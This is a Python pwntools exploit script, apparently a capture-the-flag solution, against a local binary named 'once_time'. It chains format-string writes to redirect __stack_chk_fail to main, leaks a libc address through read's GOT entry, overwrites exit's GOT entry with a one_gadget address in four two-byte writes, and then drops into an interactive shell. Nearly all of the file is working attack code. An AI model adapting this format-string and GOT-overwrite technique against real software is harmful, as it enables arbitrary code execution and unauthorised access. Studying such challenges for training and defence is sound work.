#!/usr/bin/env python
#coding=utf-8
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
p = process('./once_time')
elf = ELF('./once_time')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget_offset = 0xf1147

info('>>> REPLACE __stack_chk_fail WITH main <<<')
main = 0x400983
stack_chk_fail_got = elf.got['__stack_chk_fail']
p.recvuntil('input your name: ')
p.sendline(p64(stack_chk_fail_got))
p.recvuntil('leave a msg: ')
payload = '%{}c%12$n'.format(str(main))
payload = payload.ljust(0x20, '\x00')
print repr(payload)
p.send(payload)

info('>>> LEAK libc <<<')
read_got = elf.got['read']
p.recvuntil('input your name: ')
p.sendline(p64(read_got))
p.recvuntil('leave a msg: ')
payload = '%12$s'
payload = payload.ljust(0x20, '\x00')
print repr(payload)
p.send(payload)
data = p.recvuntil('\x7f')
print u64(data[-6:].ljust(8, '\x00'))
read_offset = libc.symbols['read']
libc_base = u64(data[:6].ljust(8, '\x00')) - read_offset
# libc.address = read - read_offset
success('libc_base = ' + hex(libc_base))

one_gadget = libc_base + one_gadget_offset
success('one_gadget = ' + hex(one_gadget))

info('>>> FMTSTR ATTACK <<<')
info('FIRST WORD')
info(hex(one_gadget & 0xFFFF))
exit_got = elf.got['exit']
p.recvuntil('input your name: ')
p.sendline(p64(exit_got))
p.recvuntil('leave a msg: ')
payload = '%{}c%12$hn'.format(str(one_gadget & 0xFFFF))#取最低的双字节并对齐
payload = payload.ljust(0x20, '\x00')
print repr(payload)
p.send(payload)

info('SECOND WORD')
info(hex((one_gadget >> 16) & 0xFFFF))
p.recvuntil('input your name: ')
p.sendline(p64(exit_got + 2))
p.recvuntil('leave a msg: ')
payload = '%{}c%12$hn'.format(str((one_gadget >> 16) & 0xFFFF))
payload = payload.ljust(0x20, '\x00')
print repr(payload)
p.send(payload)

info('THIRD WORD')
info(hex((one_gadget >> 32) & 0xFFFF))
p.recvuntil('input your name: ')
p.sendline(p64(exit_got + 4))
p.recvuntil('leave a msg: ')
payload = '%{}c%12$hn'.format(str((one_gadget >> 32) & 0xFFFF))
payload = payload.ljust(0x20, '\x00')
print repr(payload)
p.send(payload)

info('FOURTH WORD')
info(hex((one_gadget >> 48) & 0xFFFF))
p.recvuntil('input your name: ')
p.sendline(p64(exit_got + 6))
p.recvuntil('leave a msg: ')
if (one_gadget >> 48) & 0xFFFF != 0:
    payload = '%{}c%12$hn'.format(str((one_gadget >> 48) & 0xFFFF))
else:
    payload = '%12$hn'
payload = payload.ljust(0x20, '\x00')
print repr(payload)
p.send(payload)

p.recvuntil('input your name: ')
p.sendline('root')
p.recvuntil('leave a msg: ')
p.sendline('%p')
p.recvuntil('\n')
success('>>> PWNED BY ASSASSINQ <<<')
p.interactive()
